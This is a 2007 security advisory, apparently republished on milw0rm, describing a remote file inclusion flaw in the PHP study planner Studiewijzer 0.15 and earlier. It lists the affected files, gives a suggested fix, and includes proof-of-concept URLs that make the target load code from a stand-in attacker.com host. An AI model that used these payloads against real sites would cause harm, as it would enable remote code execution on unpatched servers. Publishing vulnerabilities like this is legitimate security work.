____________________   ___ ___ ________
\_   _____/\_   ___ \ /   |   \\_____  \
 |    __)_ /    \  \//    ~    \/   |   \
 |        \\     \___\    Y    /    |    \
/_______  / \______  /\___|_  /\_______  /
        \/         \/       \/         \/

                                        .OR.ID
ECHO_ADV_77$2007

-----------------------------------------------------------------------------------------
[ECHO_ADV_77$2007] Study planner (Studiewijzer) <= 0.15 Remote File Inclusion Vulnerability
-----------------------------------------------------------------------------------------

Author         : M.Hasran Addahroni
Date           : March, 21th 2007
Location       : Australia, Sydney
Web            : http://advisories.echo.or.id/adv/adv77-K-159-2007.txt
Critical Lvl   : Dangerous
Impact	       : System access
Where	       : From Remote
---------------------------------------------------------------------------

Affected software description:
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Application   : Study planner (Studiewijzer)
version       : <= 0.15
Vendor        : http://www.studiewijzer.nl/
                http://sourceforge.net/projects/splanner
Description :

A study planner, helping students to choose and plan the appropriate actions or tasks in order to reach their goals (PHP based)

---------------------------------------------------------------------------

Vulnerability:
~~~~~~~~~~~~~
- Invalid include function at inc/service.alert.inc.php :

----------------inc/service.alert.inc.php-------------------
<?php
/**
 * Alerting service
 *
 * $Author: jebbol $
 * $Revision: 1.1 $
 * $Date: 2006/08/24 17:33:44 $
 *
 * @copyright Copyright (c) 2005-2006 Studiewijzer.nl
 * @link      http://www.studiewijzer.nl
 * @license   http://www.gnu.org/copyleft/gpl.html
 */

include_once ($SPL_CFG['dirroot'].'/class/stu.class.php');
...
----------------------------------------------------------------


Variables $SPL_CFG['dirroot'] is not properly sanitized.
When register_globals=on and allow_fopenurl=on an attacker can exploit this vulnerability with a simple php injection script.

also affected files :
inc/settings.ses.php
db/mysql/db.inc.php
integration/shortstat/configuration.php
methodology/traditional/class/ali.class.php
methodology/traditional/class/cat.class.php
methodology/traditional/ui/inc/cat_browse.inc.php
methodology/traditional/ui/inc/chr_browse.inc.php
methodology/traditional/ui/inc/chr_display.inc.php
methodology/traditional/ui/inc/dash_browse.inc.php
ws/spl.webservice.php
ws/konfabulator/gateway_admin.php

and more ..

Poc/Exploit:
~~~~~~~~~

http://www.target.com/[splanner_path]/inc/service.alert.inc.php?SPL_CFG[dirroot]=http://attacker.com/evil?
http://www.target.com/[splanner_path]/inc/settings.ses.php?SPL_CFG[dirroot]=http://attacker.com/evil?
http://www.target.com/[splanner_path]/db/mysql/db.inc.php?SPL_CFG[dirroot]=http://attacker.com/evil?
http://www.target.com/[splanner_path]/integration/shortstat/configuration.php?SPL_CFG[dirroot]=http://attacker.com/evil?



Solution:
~~~~~~

- Sanitize variable $SPL_CFG['dirroot'] on affected file.
- Turn off register_globals

---------------------------------------------------------------------------

Shoutz:
~~~~
~ ping - my dearest wife, and my little son, for all the luv the tears n the breath
~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative, str0ke (for the best comments)
~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw
~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry, x16
~ newbie_hacker@yahoogroups.com
~ #aikmel #e-c-h-o @irc.dal.net

---------------------------------------------------------------------------
Contact:
~~~~~

     K-159 || echo|staff || eufrato[at]gmail[dot]com
     Homepage: http://k-159.echo.or.id/

-------------------------------- [ EOF ] ----------------------------------

# milw0rm.com [2007-03-21]